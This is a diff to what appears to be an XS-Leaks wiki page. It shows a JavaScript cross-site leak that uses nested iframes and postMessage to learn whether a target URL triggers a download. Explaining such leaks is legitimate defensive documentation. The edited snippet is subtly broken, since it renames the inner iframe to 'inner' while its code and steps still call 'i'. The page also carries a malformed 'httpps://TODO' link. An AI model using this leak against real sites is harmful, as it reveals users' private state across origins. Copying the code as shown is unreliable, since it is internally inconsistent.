@@ -51,7 +51,7 @@ setTimeout(() => {
 This attack is only possible in Chromium-based browsers.
 {{< /hint >}}
 
-### Download Non-Navigation
+### Download Navigation
 
 Another way to test for the [`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition) Header is to check if a navigation occurred. If a page load triggers a download, it will not trigger a navigation. 
 
@@ -61,33 +61,32 @@ Another way to test for the [`Content-Disposition: attachment`](https://develope
 
 The snippet presented in [Cross-Window Timing](httpps://TODO) XS-Leak can be slightly adapted to detect this behavior.
 
-#### Download Non-Navigation (without timeout)
+#### Download Navigation (without timeout)
 
+The following snippet can do a more precise measurement, without relying on timeouts and imprecise timings. The attack works as follows:
 
+1. Include an iframe (inner) inside an iframe (outer). The inner iframe embeds the target website.
+2. If the target website triggers a download the inner iframe origin will **remain** `about:blank` (downloads don’t navigate).
+3. To detect step 2, the inner iframe verifies if `i.contentWindow.location.href` (line 8) is still accessible. Otherwise, if a navigation occurs, both iframes will be in different origins which means the outer iframe it will trigger a `DOMException` when accessing to i.contentWindow.location.href`, as Same-Origin Policy is enforced.
 
-There is another way to detect whether the download attempt happened without using any timeouts, that can be helpful to perform hundreds of requests at the same time without worrying about unprecise timings. The observation is that even though the download attempt doesn't trigger an onload event the window still "waits" for the resource to be downloaded. Therefore, one could include an iframe inside an iframe to detect window.onload, and then since download doesn't trigger navigation the iframe will point to about:blank, hence, it is possible to differentiate the origin.
-
-
-```javascript
+{{< highlight javascript "linenos=table,linenostart=1" >}}
 onmessage = e => console.log(e.data);
-var ifr = document.createElement('iframe');
-var url = 'https://victim.com/might_download';
-ifr.src = `data:text/html,\
-            <iframe id='i' src="${url}" ></iframe>
+var outer = document.createElement('iframe');
+var url = 'https://target';
+outer.src = `data:text/html,\
+            <iframe id='inner' src="${url}" ></iframe>
             <script>onload=()=>{
-                try{
+                try {
                     i.contentWindow.location.href;
                     top.postMessage('download attempt','*');
-                }catch(e){
+                } catch(e) {
                     top.postMessage('no download','*');
                 }
             }%3c/script>`;
-ifr.onload = ()=>{ifr.remove();}
-document.body.appendChild(ifr);
-```
+outer.onload = ()=>{outer.remove();}
+document.body.appendChild(outer);
+{{< / highlight >}}
 
-dsasdsaddsadsadsasda
-adsadssdadsasad
 <!-- 
 ## Case Scenarios
 
